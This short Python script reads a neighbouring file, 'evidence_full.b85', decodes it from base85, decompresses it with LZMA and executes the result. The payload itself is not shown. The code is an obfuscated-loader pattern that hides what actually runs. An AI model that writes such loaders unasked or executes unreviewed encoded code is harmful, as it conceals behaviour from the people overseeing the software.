import base64,lzma
from pathlib import Path
exec(compile(lzma.decompress(base64.b85decode((Path(__file__).parent/"evidence_full.b85").read_bytes())),__file__,"exec"))
